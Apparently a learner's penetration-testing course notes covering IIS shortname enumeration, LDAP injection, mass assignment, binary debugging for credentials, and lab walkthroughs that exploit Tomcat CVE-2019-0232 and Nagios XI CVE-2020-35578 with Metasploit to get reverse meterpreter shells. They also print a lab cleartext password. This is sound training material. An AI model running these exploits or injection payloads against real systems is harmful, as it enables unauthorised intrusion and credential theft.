    # install Oracle Java before running tool

    git clone https://github.com/irsdl/IIS-ShortName-Scanner.git

    cd IIS-ShortName-Scanner/release

    # tilde enumeration using shortname scanner - 5 threads
    java -jar iis_shortname_scanner.jar 0 5 http://10.129.133.206/
    # when it prompts for proxy, hit Enter for No

    # the tool identifies a few files and folders
    # but we do not have GET access to one of the files - TRANSF~1.ASP
    # so we need to bruteforce rest of the filename

    # generate wordlist according to shortname
    # search for specific pattern recursively using egrep and store to new file
    egrep -r ^transf /usr/share/wordlists/rockyou.txt | sed 's/^[^:]*://' > /tmp/list.txt

    # enumerate to search for full filename now
    gobuster dir -u http://10.129.133.206/ -w /tmp/list.txt -x .aspx,.asp
    ```

* Attacking LDAP:

  * LDAP (lightweight directory access protocol) - used to access & manage directory info (hierarchical data store containing info about network resources); it is based on the X.500 standard for directory services

  * LDAP offers features like global naming model, authentication & compatibility; but suffers from issues like complexity, encryption not enabled by default and injection attacks

  * common implementations include ```OpenLDAP``` (open-source) and ```Microsoft Active Directory``` (Windows-based); LDAP is a protocol while AD is a directory service

  * LDAP uses a client-server architecture - client sends LDAP request to server, which searches the directory service and returns response to client

  * LDAP requests - messages sent by clients to perform operations on data in directory services; components include session connection, request type, request parameters and request ID (similarly, response includes response type, result code, matched DN, and referral)

  * ```ldapsearch``` - used to query & retrieve data from a LDAP directory service:

    ```sh
    ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
    # bind/authenticate as cn=admin,dc=example,dc=com and secret
    # search under base DN - distinguished name - ou=people,dc=example,dc=com
    # and use filter mail=john.doe@example.com while finding entries with this email
    ```
  
  * LDAP injection - we can test these attacks by inputting values with special chars or operators; similar to SQLi, but targets LDAP directory service:

    ```php
    // suppose app uses this LDAP query for user authentication
    (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

    // if we inject * into $username - match any no. of chars, we can gain access to app with any password
    // if we inject * into $password, we can gain access with any username
    ```
  
  * enumeration:

    ```sh
    nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
    # if openLDAP is being used on port 389 for example
    # then webapp on port 80 can use LDAP for auth - we can try injection
    ```

* Web mass-assignment vulnerabilities:

  * attackers can use web mass-assignment features to modify the attributes of web app through parameters sent to server

  * for the given example, we have a web app with registration & login functionality; we have been given the app code as well

  * from the code for the registration part, we can see that it checks for a 'confirmed' parameter, and then it inserts 'cond' as 'True' to bypass the registration step

  * keeping this in mind, we can try registering another user by setting 'confirmed' parameter to a random value - in Burp Suite, modify the POST request and set the params ```username=new&password=secret123&confirmed=test```

  * by modifying that param, we are able to login without further steps

  * to prevent these attacks, either assign attributes for allowed fields explicitly; or use whitelisting methods to check which attributes can be mass-assigned and ignore any other input sent by client

* Attacking apps connecting to services:

  * ELF executables:

    ```sh
    # run the binary and check for any messages/errors
    ./octopus_checker
    # this app attempts to connect to DBs using a SQL connection string

    # we can debug this using tools like GDB

    gdb ./octopus_checker

    # in gdb
    # define display style of code and disassemble the main function of program
    set disassembly-flavor intel
    disas main

    # this reveals several call instructions pointing to addresses having strings
    # from endianness of bytes, the string text seems to be reversed

    # we have a call to SQLDriverConnect, so we can add a breakpoint at this address

    b *0x5555555551b0
    # the address referenced in the call set as breakpoint

    # in case we do not get the correct breakpoint format error
    # we need to run the program once and then disassemble the main function again to get right address

    run
    # run the program again
    # this time we can see a SQL connection string in the RDX register address, includes creds
    ```
  
  * DLL files:

    ```ps
    # check the DLL file metadata
    Get-FileMetaData .\MultimasterAPI.dll

    # we can use dnSpy for debugging and .NET assembly editing
    # to view source code of DLL file
    ```

## Skills Assessment

* Skills Assessment I:

  * Scan given host:

    ```sh
    nmap -T4 -p- -A -Pn -v 10.129.201.89
    ```
  
  * We can see the Windows server is running ```Apache Tomcat/Coyote JSP engine 1.1``` on port 8080; navigating to '/docs' shows it is running Tomcat version 9.0.0.M1

  * We are not able to access the manager app at '/manager/html' or the host manager at 'host_manager/html' as we get the HTTP 404 error; need to enumerate further

  * Now, this version is vulnerable to [Ghostcat exploit CVE-2020-1938](https://www.exploit-db.com/exploits/49039) - we can try checking for any clues:

    ```sh
    msfconsole -q

    search ghostcat

    use 0
    # auxiliary/admin/http/tomcat_ghostcat

    options

    set RHOSTS 10.129.201.89

    run
    # by default, it reads the file /WEB-INF/web.xml
    # nothing interesting found
    ```
  
  * Directory enumeration on port 8080 to search for other endpoints:

    ```sh
    gobuster dir -u http://10.129.201.89:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    ```
  
  * This version of Apache can be vulnerable to [CVE-2019-0232](https://github.com/setrus/CVE-2019-0232) - we need to check if any batch files are present in the '/cgi' or '/cgi-bin' directory:

    ```sh
    gobuster dir -u http://10.129.201.89:8080/cgi -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x bat
    # we get cmd.bat
    ```
  
  * We can try exploiting CVE-2019-0232 now:

    ```sh
    msfconsole -q

    search CVE-2019-0232

    use 0
    # exploit/windows/http/tomcat_cgi_cmdlineargs

    options

    set RHOSTS 10.129.201.89

    set TARGETURI /cgi/cmd.bat

    set LHOST 10.10.117.16

    run
    # we need to set force run exploit

    set ForceExploit true

    run

    # this gives us meterpreter shell

    shell

    type C:\Users\Administrator\Desktop\flag.txt
    ```

* Skills Assessment II:

  * We have been given a vhost 'gitlab.inlanefreight.local' along with the server:

    ```sh
    sudo vim /etc/hosts
    # map vhost to ip

    nmap -T4 -p- -A -Pn -v 10.129.201.90
    ```
  
  * We have a webpage on port 80 - the source code for this page mentions a page  at <http://blog.inlanefreight.local> - need to map this in ```/etc/hosts```

  * Other than this, we also have a GitLab instance on port 8180 - we can create a new account and search for clues

  * On Gitlab, navigating to '/explore', we have a couple of public projects by Administrator - 'Virtualhost' and 'Nagios Postgresql'

  * The 'Nagios Postgresql' repo contains cleartext creds 'nagiosadmin:oilaKglm7M09@CPL&^lC' in the 'INSTALL' file

  * The README from the 'Virtualhost' project shows it is used to create new vhosts in the local environment - so we can search for any VHOSTs from the code or commits

  * The README mentions a FQDN 'monitoring.inlanefreight.local'; this was added in a recent commit as well so we can try mapping it to the IP in ```/etc/hosts```

  * On this VHOST, we have an instance of Nagios, an IT monitoring tool; we can use the creds found earlier on the login page and it works

  * The dashboard shows it is running 'Nagios XI 5.7.5' - searching for exploits gives us [Nagios XI 5.7.x authenticated RCE CVE-2020-35578](https://www.exploit-db.com/exploits/49422):

    ```sh
    msfconsole -q

    search cve-2020-35578

    use 0
    # exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce

    options

    set PASSWORD oilaKglm7M09@CPL&^lC

    set LHOST 10.10.116.16

    set RHOSTS 10.129.201.90

    set TARGETURI /

    set VHOST monitoring.inlanefreight.local

    run

    # this gives us a meterpreter shell
    
    shell
    # drop into a shell

    ls -la
    # we have a flag here
    ```

* Skills Assessment III:

  * We have been given a Windows host with RDP creds; we have to find the hardcoded password for the MSSQL service from the 'MultiMasterAPI.dll' file

  * This file can be found in the location ```C:/inetpub/wwwroot/bin``` - we can use 'dnSpy' tool found in ```C:/Tools``` to check this DDL further

  * The password can be found in the decompiled code from the 'MultimasterAPI.Controllers' part
